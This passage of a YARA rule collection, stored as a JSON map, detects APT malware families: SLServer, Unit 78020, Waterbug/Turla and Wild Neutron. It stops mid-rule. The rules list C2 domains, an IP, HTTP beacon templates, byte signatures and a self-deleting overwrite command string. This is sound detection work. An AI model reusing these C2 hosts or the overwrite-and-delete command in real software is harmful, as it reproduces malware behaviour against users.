  "SLServer_command_and_control": "rule SLServer_command_and_control\n{\n   \n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Searches for the C2 server.\"\n        ref = \"https://citizenlab.org/2016/04/between-hong-kong-and-burma/\"\n    \n    strings:\n        $c2 = \"safetyssl.security-centers.com\"\n        \n    condition:\n        //MZ header //PE signature\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $c2\n}",
  "SLServer_campaign_code": "rule SLServer_campaign_code\n{\n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Searches for the related campaign code.\"\n        ref = \"https://citizenlab.org/2016/04/between-hong-kong-and-burma/\"\n    \n    strings:\n        $campaign = \"wthkdoc0106\"\n        \n    condition:\n        //MZ header //PE signature\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $campaign\n}",
  "SLServer_unknown_string": "rule SLServer_unknown_string\n{\n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Searches for a unique string.\"\n        ref = \"https://citizenlab.org/2016/04/between-hong-kong-and-burma/\"\n    \n    strings:\n        $string = \"test-b7fa835a39\"\n        \n    condition:\n        //MZ header //PE signature\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $string\n}",
  "Unit78020_Malware_Gen1": "rule Unit78020_Malware_Gen1 \n{\n\n    meta:\n        description = \"Detects malware by Chinese APT PLA Unit 78020 - Generic Rule\"\n        author = \"Florian Roth\"\n        reference = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n        date = \"2015-09-24\"\n        hash1 = \"2b15e614fb54bca7031f64ab6caa1f77b4c07dac186826a6cd2e254090675d72\"\n        hash2 = \"76c586e89c30a97e583c40ebe3f4ba75d5e02e52959184c4ce0a46b3aac54edd\"\n        hash3 = \"2625a0d91d3cdbbc7c4a450c91e028e3609ff96c4f2a5a310ae20f73e1bc32ac\"\n        hash4 = \"5c62b1d16e6180f22a0cb59c99a7743f44cb4a41e4e090b9733d1fb687c8efa2\"\n        hash5 = \"7b73bf2d80a03eb477242967628da79924fbe06cc67c4dcdd2bdefccd6e0e1af\"\n        hash6 = \"88c5be84afe20c91e4024160303bafb044f98aa5fbf8c9f9997758a014238790\"\n\n    strings:\n        $x1 = \"greensky27.vicp.net\" fullword wide\n        $x2 = \"POST http://%s:%d/aspxabcdefg.asp?%s HTTP/1.1\" fullword ascii\n        $x3 = \"GET http://%s:%d/aspxabcdef.asp?%s HTTP/1.1\" fullword ascii\n        /* additional strings based on PDF report - not found in samples */\n        $x4 = \"serch.vicp.net\" fullword wide\n        $x5 = \"greensky27.vicp.net\" fullword wide\n        $x6 = \"greensky27.vicp.net.as\" fullword wide\n        $x7 = \"greensky27.vcip.net\" fullword wide\n        $x8 = \"pnoc-ec.vicp.net\" fullword wide\n        $x9 = \"aseanph.vicp.net\" fullword wide\n        $x10 = \"pnoc.vicp.net\" fullword wide\n        $a1 = \"dMozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.0; .NET CLR 1.1.4322)\" fullword wide /* typo */\n        $a2 = \"User-Agent: Netscape\" fullword ascii /* ;) */\n        $a3 = \"Accept-Language:En-us/r/n\" fullword wide /* typo */\n        $a4 = \"\\\\Office Start.lnk\" fullword wide\n        $a5 = \"\\\\MSN Talk Start.lnk\" fullword wide\n        $s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\" fullword wide\n        $s2 = \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7\" fullword ascii\n        $s3 = \"%USERPROFILE%\\\\Application Data\\\\Mozilla\\\\Firefox\\\\Profiles\" fullword wide\n        $s4 = \"Content-Type:application/x-www-form-urlencoded/r/n\" fullword wide\n        $s5 = \"Hello World!\" fullword wide\n        $s6 = \"Accept-Encoding:gzip,deflate/r/n\" fullword wide\n        $s7 = \"/%d%s%d\" fullword ascii\n        $s8 = \"%02d-%02d-%02d %02d:%02d\" fullword wide\n        $s9 = \"WininetMM Version 1.0\" fullword wide\n        $s10 = \"WININETMM\" fullword wide\n        $s11 = \"GET %dHTTP/1.1\" fullword ascii\n        $s12 = \"POST http://%ws:%d/%d%s%dHTTP/1.1\" fullword ascii\n        $s13 = \"PeekNamePipe\" fullword ascii\n        $s14 = \"Normal.dot\" fullword ascii\n        $s15 = \"R_eOR_eOR_eO)CiOS_eO\" fullword ascii\n        $s16 = \"DRIVE_RAMDISK\" fullword wide\n        $s17 = \"%s %s %s %s %d %d %d %d \" fullword ascii\n    \n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 250KB and 1 of ($x*) ) or 2 of ($a*) or 6 of ($s*) \n\n}",
  "Unit78020_Malware_1": "rule Unit78020_Malware_1  \n{\n\n    meta:\n        description = \"Detects malware by Chinese APT PLA Unit 78020 - Specific Rule - msictl.exe\"\n        author = \"Florian Roth\"\n        reference = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n        date = \"2015-09-24\"\n        hash = \"a93d01f1cc2d18ced2f3b2b78319aadc112f611ab8911ae9e55e13557c1c791a\"\n   \n    strings:\n        $s1 = \"%ProgramFiles%\\\\Internet Explorer\\\\iexplore.exe\" fullword ascii\n        $s2 = \"msictl.exe\" fullword ascii\n        $s3 = \"127.0.0.1:8080\" fullword ascii\n        $s4 = \"mshtml.dat\" fullword ascii\n        $s5 = \"msisvc\" fullword ascii\n        $s6 = \"NOKIAN95/WEB\" fullword ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 160KB and 4 of them\n}",
  "Unit78020_Malware_Gen2": "rule Unit78020_Malware_Gen2 \n{\n\n    meta:\n        description = \"Detects malware by Chinese APT PLA Unit 78020 - Generic Rule\"\n        author = \"Florian Roth\"\n        reference = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n        date = \"2015-09-24\"\n        super_rule = 1\n        hash1 = \"76c586e89c30a97e583c40ebe3f4ba75d5e02e52959184c4ce0a46b3aac54edd\"\n        hash2 = \"7b73bf2d80a03eb477242967628da79924fbe06cc67c4dcdd2bdefccd6e0e1af\"\n        hash3 = \"981e2fa1ae4145359036b46e8b53cc5da37dd2311204859761bd91572f025e8a\"\n  \n   strings:\n        $s0 = \"-GetModuleFileNameExW\" fullword ascii\n        $s1 = \"\\\\MSN Talk Start.lnk\" fullword wide\n        $s2 = \":SeDebugPrivilege\" fullword wide\n        $s3 = \"WinMM Version 1.0\" fullword wide\n        $s4 = \"dwError1 = %d\" fullword ascii\n        $s5 = \"*Can't Get\" fullword wide\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}",
  "Unit78020_Malware_Gen3": "rule Unit78020_Malware_Gen3 \n{\n\n    meta:\n        description = \"Detects malware by Chinese APT PLA Unit 78020 - Generic Rule - Chong\"\n        author = \"Florian Roth\"\n        reference = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n        date = \"2015-09-24\"\n        super_rule = 1\n        hash1 = \"2625a0d91d3cdbbc7c4a450c91e028e3609ff96c4f2a5a310ae20f73e1bc32ac\"\n        hash2 = \"5c62b1d16e6180f22a0cb59c99a7743f44cb4a41e4e090b9733d1fb687c8efa2\"\n   \n    strings:\n        $x1 = \"GET http://%ws:%d/%d%s%dHTTP/1.1\" fullword ascii\n        $x2 = \"POST http://%ws:%d/%d%s%dHTTP/1.1\" fullword ascii\n        $x3 = \"J:\\\\chong\\\\\" ascii\n        $s1 = \"User-Agent: Netscape\" fullword ascii\n        $s2 = \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7\" fullword ascii\n        $s3 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\explorer\\\\User Shell Folders\" fullword wide\n        $s4 = \"J:\\\\chong\\\\nod\\\\Release\\\\SslMM.exe\" fullword ascii\n        $s5 = \"MM.exe\" fullword ascii\n        $s6 = \"network.proxy.ssl\" fullword wide\n        $s7 = \"PeekNamePipe\" fullword ascii\n        $s8 = \"Host: %ws:%d\" fullword ascii\n        $s9 = \"GET %dHTTP/1.1\" fullword ascii\n        $s10 = \"SCHANNEL.DLL\" fullword ascii /* Goodware String - occured 6 times */\n    \n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of ($x*) ) or 4 of ($s*)\n}",
  "WaterBug_wipbot_2013_core_PDF": "rule WaterBug_wipbot_2013_core_PDF \n{\n\n    meta:\n        description = \"Symantec Waterbug Attack - Trojan.Wipbot 2014 core PDF\"\n        author = \"Symantec Security Response\"\n        date = \"22.01.2015\"\n        reference = \"http://t.co/rF35OaAXrl\"\n \n    strings:\n        $PDF = \"%PDF-\"\n        $a = /\\+[A-Za-z]{1}\\. _ _ \\$\\+[A-Za-z]{1}\\. _ \\$ _ \\+/ \n        $b = /\\+[A-Za-z]{1}\\.\\$\\$\\$ _ \\+/\n \n    condition:\n        ($PDF at 0) and #a > 150 and #b > 200\n}",
  "WaterBug_wipbot_2013_dll": "rule WaterBug_wipbot_2013_dll \n{\n\n    meta:\n        description = \"Symantec Waterbug Attack - Trojan.Wipbot 2014 Down.dll component\"\n        author = \"Symantec Security Response\"\n        date = \"22.01.2015\"\n        reference = \"http://t.co/rF35OaAXrl\"        \n  \n    strings:\n        $string1 = \"/%s?rank=%s\"\n        $string2 = \"ModuleStart\\x00ModuleStop\\x00start\"\n        $string3 = \"1156fd22-3443-4344-c4ffff\"\n        //read file... error..\n        $string4 = \"read\\x20file\\x2E\\x2E\\x2E\\x20error\\x00\\x00\"\n  \n    condition:\n        2 of them\n}",
  "WaterBug_wipbot_2013_core": "rule WaterBug_wipbot_2013_core \n{\n\n    meta:\n        description = \"Symantec Waterbug Attack - Trojan.Wipbot core + core; garbage appended data (PDF Exploit leftovers) + wipbot dropper; fake AdobeRd32 Error\"\n        author = \"Symantec Security Response\"\n        date = \"22.01.2015\"\n        reference = \"http://t.co/rF35OaAXrl\"            \n\n    strings:\n        $mz = \"MZ\"\n        $code1 = { 89 47 0C C7 47 10 90 C2 04 00 C7 47 14 90 C2 10 00 C7 47 18 90 90 60 68 89 4F 1C C7 47 20 90 90 90 B8 89 4F 24 C7 47 28 90 FF D0 61 C7 47 2C 90 C2 04 00}\n        $code2 = { 85 C0 75 25 8B 0B BF ?? ?? ?? ?? EB 17 69 D7 0D 66 19 00 8D BA 5F F3 6E 3C 89 FE C1 EE 10 89 F2 30 14 01 40 3B 43 04 72 E4}\n        $code3 = {90 90 90 ?? B9 00 4D 5A 90 00 03 00 00 00 82 04} $code4 = {55 89 E5 5D C3 55 89 E5 83 EC 18 8B 45 08 85 C0}\n\n    condition:\n        $mz at 0 and (($code1 or $code2) or ($code3 and $code4))\n}",
  "WaterBug_turla_dropper": "rule WaterBug_turla_dropper \n{\n\n    meta:\n        description = \"Symantec Waterbug Attack - Trojan Turla Dropper\"\n        author = \"Symantec Security Response\"\n        date = \"22.01.2015\"\n        reference = \"http://t.co/rF35OaAXrl\"\n\n    strings: \n        $a = {0F 31 14 31 20 31 3C 31 85 31 8C 31 A8 31 B1 31 D1 31 8B 32 91 32 B6 32 C4 32 6C 33 AC 33 10 34}\n        $b = {48 41 4C 2E 64 6C 6C 00 6E 74 64 6C 6C 00 00 00 57 8B F9 8B 0D ?? ?? ?? ?? ?? C9 75 26 56 0F 20 C6 8B C6 25 FF FF FE FF 0F 22 C0 E8}\n\n    condition: \n        all of them\n}",
  "WaterBug_fa_malware": "rule WaterBug_fa_malware \n{ \n\n    meta: \n        description = \"Symantec Waterbug Attack - FA malware variant\"\n        author = \"Symantec Security Response\"\n        date = \"22.01.2015\"\n        reference = \"http://t.co/rF35OaAXrl\"\n\n    strings:\n        $mz = \"MZ\"\n        $string1 = \"C:\\\\proj\\\\drivers\\\\fa _ 2009\\\\objfre\\\\i386\\\\atmarpd.pdb\"\n        $string2 = \"d:\\\\proj\\\\cn\\\\fa64\\\\\"\n        $string3 = \"sengoku_Win32.sys\\x00\"\n        $string4 = \"rk_ntsystem.c\"\n        $string5 = \"\\\\uroboros\\\\\"\n        $string6 = \"shell.{F21EDC09-85D3-4eb9-915F-1AFA2FF28153}\"\n\n    condition:\n        ($mz at 0) and (any of ($string*))\n}",
  "WaterBug_sav": "rule WaterBug_sav \n{\n\n    meta: \n        description = \"Symantec Waterbug Attack - SAV Malware\"\n        author = \"Symantec Security Response\"\n        date = \"22.01.2015\"\n        reference = \"http://t.co/rF35OaAXrl\"    \n\n    strings:\n        $mz = \"MZ\"\n        $code1a = { 8B 75 18 31 34 81 40 3B C2 72 F5 33 F6 39 7D 14 76 1B 8A 04 0E 88 04 0F 6A 0F 33 D2 8B C7 5B F7 F3 85 D2 75 01 }\n        $code1b = { 8B 45 F8 40 89 45 F8 8B 45 10 C1 E8 02 39 45 F8 73 17 8B 45 F8 8B 4D F4 8B 04 81 33 45 20 8B 4D F8 8B 55 F4 89 04 8A EB D7 83 65 F8 00 83 65 EC 00 EB 0E 8B 45 F8 40 89 45 F8 8B 45 EC 40 89 45 EC 8B 45 EC 3B 45 10 73 27 8B 45 F4 03 45 F8 8B 4D F4 03 4D EC 8A 09 88 08 8B 45 F8 33 D2 6A 0F 59 F7 F1 85 D2 75 07 }\n        $code1c = { 8A 04 0F 88 04 0E 6A 0F 33 D2 8B C6 5B F7 F3 85 D2 75 01 47 8B 45 14 46 47 3B F8 72 E3 EB 04 C6 04 08 00 48 3B C6 73 F7 33 C0 C1 EE 02 74 0B 8B 55 18 31 14 81 40 3B C6 72 F5 }\n        $code2 =  { 29 5D 0C 8B D1 C1 EA 05 2B CA 8B 55 F4 2B C3 3D 00 00 00 01 89 0F 8B 4D 10 8D 94 91 00 03 00 00 73 17 8B 7D F8 8B 4D 0C 0F B6 3F C1 E1 08 0B CF C1 E0 08 FF 45 F8 89 4D 0C 8B 0A 8B F8 C1 EF 0B}\n   \n    condition:\n        ($mz at 0) and (($code1a or $code1b or $code1c) and $code2) \n}",
  "WildNeutron_Sample_1": "rule WildNeutron_Sample_1 \n{\n\n    meta:\n        description = \"Wild Neutron APT Sample Rule - file 2b5065a3d0e0b8252a987ef5f29d9e1935c5863f5718b83440e68dc53c21fa94\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        date = \"2015-07-10\"\n        score = 60\n        hash = \"2b5065a3d0e0b8252a987ef5f29d9e1935c5863f5718b83440e68dc53c21fa94\"\n\n    strings:\n        $s0 = \"LiveUpdater.exe\" fullword wide /* PEStudio Blacklist: strings */ /* score: '25.00' */\n        $s1 = \"id-at-postalAddress\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00' */\n        $s2 = \"%d -> %d (default)\" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */\n        $s3 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide /* score: '15.00' */\n        $s8 = \"id-ce-keyUsage\" fullword ascii /* score: '12.00' */\n        $s9 = \"Key Usage\" fullword ascii /* score: '12.00' */\n        $s32 = \"UPDATE_ID\" fullword wide /* PEStudio Blacklist: strings */ /* score: '9.00' */\n        $s37 = \"id-at-commonName\" fullword ascii /* score: '8.00' */\n        $s38 = \"2008R2\" fullword wide /* PEStudio Blacklist: os */ /* score: '8.00' */\n        $s39 = \"RSA-alt\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00' */\n        $s40 = \"%02d.%04d.%s\" fullword wide /* score: '7.02' */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and all of them\n}",
  "WildNeutron_Sample_2": "rule WildNeutron_Sample_2 \n{\n\n    meta:\n        description = \"Wild Neutron APT Sample Rule - file 8d80f9ef55324212759f4b6070cb8fce18a008ae9dd8b9598553206654d13a6f\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        date = \"2015-07-10\"\n        score = 60\n        hash = \"8d80f9ef55324212759f4b6070cb8fce18a008ae9dd8b9598553206654d13a6f\"\n\n    strings:\n        $s0 = \"rundll32.exe \\\"%s\\\",#1\" fullword wide /* PEStudio Blacklist: strings */ /* score: '33.00' */\n        $s1 = \"IgfxUpt.exe\" fullword wide /* score: '20.00' */\n        $s2 = \"id-at-postalAddress\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00' */\n        $s3 = \"Intel(R) Common User Interface\" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */\n        $s4 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide /* score: '15.00' */\n        $s11 = \"Key Usage\" fullword ascii /* score: '12.00' */\n        $s12 = \"Intel Integrated Graphics Updater\" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00' */\n        $s13 = \"%sexpires on    : %04d-%02d-%02d %02d:%02d:%02d\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '11.00' */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 600KB and all of them\n}",
  "WildNeutron_Sample_3": "rule WildNeutron_Sample_3 \n{\n\n    meta:\n        description = \"Wild Neutron APT Sample Rule - file c2c761cde3175f6e40ed934f2e82c76602c81e2128187bab61793ddb3bc686d0\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        date = \"2015-07-10\"\n        score = 60\n        hash = \"c2c761cde3175f6e40ed934f2e82c76602c81e2128187bab61793ddb3bc686d0\"\n   \n    strings:\n        $x1 = \"178.162.197.9\" fullword ascii /* score: '9.00' */\n        $x2 = \"\\\"http://fw.ddosprotected.eu:80 /opts resolv=drfx.chickenkiller.com\\\"\" fullword wide /* PEStudio Blacklist: strings */ /* score: '33.00' */\n        $s1 = \"LiveUpdater.exe\" fullword wide /* PEStudio Blacklist: strings */ /* score: '25.00' */\n        $s2 = \"id-at-postalAddress\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00' */\n        $s3 = \"%d -> %d (default)\" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */\n        $s4 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide /* score: '15.00' */\n        $s5 = \"id-at-serialNumber\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */\n        $s6 = \"ECDSA with SHA256\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */\n        $s7 = \"Acer LiveUpdater\" fullword wide /* PEStudio Blacklist: strings */ /* score: '10.00' */\n    \n    condition:\n        uint16(0) == 0x5a4d and filesize < 2020KB and ( 1 of ($x*) or all of ($s*) )\n}",
  "WildNeutron_Sample_4": "rule WildNeutron_Sample_4 \n{\n\n    meta:\n        description = \"Wild Neutron APT Sample Rule - file b4005530193bc523d3e0193c3c53e2737ae3bf9f76d12c827c0b5cd0dcbaae45\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        date = \"2015-07-10\"\n        score = 60\n        hash = \"b4005530193bc523d3e0193c3c53e2737ae3bf9f76d12c827c0b5cd0dcbaae45\"\n\n    strings:\n        $x1 = \"WinRAT-Win32-Release.exe\" fullword ascii /* score: '22.00' */\n        $s0 = \"rundll32.exe \\\"%s\\\",#1\" fullword wide /* PEStudio Blacklist: strings */ /* score: '33.00' */\n        $s1 = \"RtlUpd.EXE\" fullword wide /* score: '20.00' */\n        $s2 = \"RtlUpd.exe\" fullword wide /* score: '20.00' */\n        $s3 = \"Driver Update and remove for Windows x64 or x86_32\" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */\n        $s4 = \"Realtek HD Audio Update and remove driver Tool\" fullword wide /* PEStudio Blacklist: strings */ /* score: '16.00' */\n        $s5 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide /* score: '15.00' */\n        $s6 = \"Key Usage\" fullword ascii /* score: '12.00' */\n        $s7 = \"id-at-serialNumber\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */\n  \n    condition:\n        uint16(0) == 0x5a4d and filesize < 1240KB and all of them\n}",
  "WildNeutron_Sample_5": "rule WildNeutron_Sample_5 \n{\n\n    meta:\n        description = \"Wild Neutron APT Sample Rule - file 1604e36ccef5fa221b101d7f043ad7f856b84bf1a80774aa33d91c2a9a226206\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        date = \"2015-07-10\"\n        score = 60\n        hash = \"1604e36ccef5fa221b101d7f043ad7f856b84bf1a80774aa33d91c2a9a226206\"\n\n    strings:\n        $s0 = \"LiveUpdater.exe\" fullword wide /* PEStudio Blacklist: strings */ /* score: '25.00' */\n        $s1 = \"id-at-postalAddress\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00' */\n        $s2 = \"%d -> %d (default)\" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */\n        $s3 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide /* score: '15.00' */\n        $s4 = \"sha-1WithRSAEncryption\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */\n        $s5 = \"Postal code\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.00' */\n        $s6 = \"id-ce-keyUsage\" fullword ascii /* score: '12.00' */\n        $s7 = \"Key Usage\" fullword ascii /* score: '12.00' */\n        $s8 = \"TLS-RSA-WITH-3DES-EDE-CBC-SHA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '11.00' */\n        $s9 = \"%02d.%04d.%s\" fullword wide /* score: '7.02' */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}",
  "WildNeutron_Sample_6": "rule WildNeutron_Sample_6 \n{\n\n    meta:\n        description = \"Wild Neutron APT Sample Rule - file 4bd548fe07b19178281edb1ee81c9711525dab03dc0b6676963019c44cc75865\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        date = \"2015-07-10\"\n        score = 60\n        hash = \"4bd548fe07b19178281edb1ee81c9711525dab03dc0b6676963019c44cc75865\"\n\n    strings:\n        $s0 = \"mshtaex.exe\" fullword wide /* score: '20.00' */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 310KB and all of them\n}",
  "WildNeutron_Sample_7": "rule WildNeutron_Sample_7 \n{\n\n    meta:\n        description = \"Wild Neutron APT Sample Rule - file a14d31eb965ea8a37ebcc3b5635099f2ca08365646437c770212d534d504ff3c\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        date = \"2015-07-10\"\n        score = 60\n        hash = \"a14d31eb965ea8a37ebcc3b5635099f2ca08365646437c770212d534d504ff3c\"\n\n    strings:\n        $s0 = \"checking match for '%s' user %s host %s addr %s\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00' */\n        $s1 = \"PEM_read_bio_PrivateKey failed\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00' */\n        $s2 = \"usage: %s [-ehR] [-f log_facility] [-l log_level] [-u umask]\" fullword ascii /* score: '23.00' */\n        $s3 = \"%s %s for %s%.100s from %.200s port %d%s\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00' */\n        $s4 = \"clapi32.dll\" fullword ascii /* score: '21.00' */\n        $s5 = \"Connection from %s port %d\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */\n        $s6 = \"/usr/etc/ssh_known_hosts\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.00' */\n        $s7 = \"Version: %s - %s %s %s %s\" fullword ascii /* score: '16.00' */\n        $s8 = \"[-] connect()\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '13.00' */\n        $s9 = \"/bin/sh /usr/etc/sshrc\" fullword ascii /* score: '12.42' */\n        $s10 = \"kexecdhs.c\" fullword ascii /* score: '12.00' */\n        $s11 = \"%s: setrlimit(RLIMIT_FSIZE, { 0, 0 }): %s\" fullword ascii /* score: '11.00' */\n    \n    condition:\n        uint16(0) == 0x5a4d and filesize < 5000KB and all of them\n}",
  "WildNeutron_Sample_8": "rule WildNeutron_Sample_8 \n{\n\n    meta:\n        description = \"Wild Neutron APT Sample Rule - file 758e6b519f6c0931ff93542b767524fc1eab589feb5cfc3854c77842f9785c92\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        date = \"2015-07-10\"\n        score = 60\n        hash = \"758e6b519f6c0931ff93542b767524fc1eab589feb5cfc3854c77842f9785c92\"\n\n    strings:\n        $x1 = \"RunFile: couldn't load SHELL32.DLL!\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */\n        $x2 = \"RunFile: couldn't find ShellExecuteExA/W in SHELL32.DLL!\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00' */\n        $x3 = \"Error executing CreateProcess()!!\" fullword wide /* PEStudio Blacklist: strings */ /* score: '31.00' */\n        $x4 = \"cmdcmdline\" fullword wide /* score: '11.00' */\n        $x5 = \"Invalid input handle!!!\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */\n        $s1 = \"Process %d terminated\" fullword wide /* PEStudio Blacklist: strings */ /* score: '24.00' */\n        $s2 = \"Process is not running any more\" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00' */\n        $s3 = \"javacpl.exe\" fullword wide /* score: '3.00' */ /* Goodware String - occured 2 times */\n        $s4 = \"Windows NT Version %lu.%lu\" fullword wide /* PEStudio Blacklist: os */ /* score: '19.00' */\n        $s5 = \"Usage: destination [reference]\" fullword wide /* PEStudio Blacklist: strings */ /* score: '16.00' */\n        $s6 = \".com;.exe;.bat;.cmd\" fullword wide /* score: '15.00' */\n        $s7 = \") -%s-> %s (\" fullword ascii /* score: '14.00' */\n        $s8 = \"cmdextversion\" fullword wide /* score: '14.00' */\n        $s9 = \"Invalid pid (%s)\" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.00' */\n        $s10 = \"\\\"%s\\\" /K %s\" fullword wide /* score: '11.02' */\n        $s11 = \"Error setting %s (%s)\" fullword wide /* score: '11.00' */\n        $s12 = \"DEBUG: Cannot allocate memory for ptrNextNode->ptrNext!\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */\n        $s13 = \"Failed to build full directory path\" fullword wide /* score: '10.00' */\n        $s14 = \"DEBUG: Cannot allocate memory for ptrFileArray!\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00' */\n        $s15 = \"%-8s %-3s  %*s %s  %s\" fullword wide /* score: '8.00' */\n        $s16 = \" %%%c in (%s) do \" fullword wide /* score: '8.00' */\n    \n    condition:\n        uint16(0) == 0x5a4d and filesize < 1677KB and 2 of ($x*) and 6 of ($s*)\n}",
  "WildNeutron_Sample_9": "rule WildNeutron_Sample_9 \n{\n\n    meta:\n        description = \"Wild Neutron APT Sample Rule - file 781eb1e17349009fbae46aea5c59d8e5b68ae0b42335cb035742f6b0f4e4087e\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        date = \"2015-07-10\"\n        score = 60\n        hash = \"781eb1e17349009fbae46aea5c59d8e5b68ae0b42335cb035742f6b0f4e4087e\"\n \n    strings:\n        $s0 = \"http://get.adobe.com/flashplayer/\" fullword wide /* PEStudio Blacklist: strings */ /* score: '30.00' */\n        $s1 = \"xxxxxxxxxxxxxxxxxxxx\" fullword wide /* reversed goodware string 'xxxxxxxxxxxxxxxxxxxx' */ /* score: '19.00' */\n        $s4 = \" Player Installer/Uninstaller\" fullword wide /* PEStudio Blacklist: strings */ /* score: '11.42' */\n        $s5 = \"Adobe Flash Plugin Updater\" fullword wide /* PEStudio Blacklist: strings */ /* score: '11.00' */\n        $s6 = \"uSOFTWARE\\\\Adobe\" fullword wide /* PEStudio Blacklist: strings */ /* score: '10.42' */\n        $s11 = \"2008R2\" fullword wide /* PEStudio Blacklist: os */ /* score: '8.00' */\n        $s12 = \"%02d.%04d.%s\" fullword wide /* score: '7.02' */\n        $s13 = \"%d -> %d\" fullword wide /* score: '7.00' */\n \n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and all of them\n}",
  "WildNeutron_Sample_10": "rule WildNeutron_Sample_10 \n{\n\n    meta:\n        description = \"Wild Neutron APT Sample Rule - file 1d3bdabb350ba5a821849893dabe5d6056bf7ba1ed6042d93174ceeaa5d6dad7\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        date = \"2015-07-10\"\n        score = 60\n        hash = \"1d3bdabb350ba5a821849893dabe5d6056bf7ba1ed6042d93174ceeaa5d6dad7\"\n\n    strings:\n        $n1 = \"/c for /L %%i in (1,1,2) DO ping 127.0.0.1 -n 3 & type %%windir%%\\\\notepad.exe > %s & del /f %s\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '46.00' */        \n        $s1 = \"%SYSTEMROOT%\\\\temp\\\\_dbg.tmp\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00' */\n        $s2 = \"%SYSTEMROOT%\\\\SysWOW64\\\\mspool.dll\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.17' */\n        $s3 = 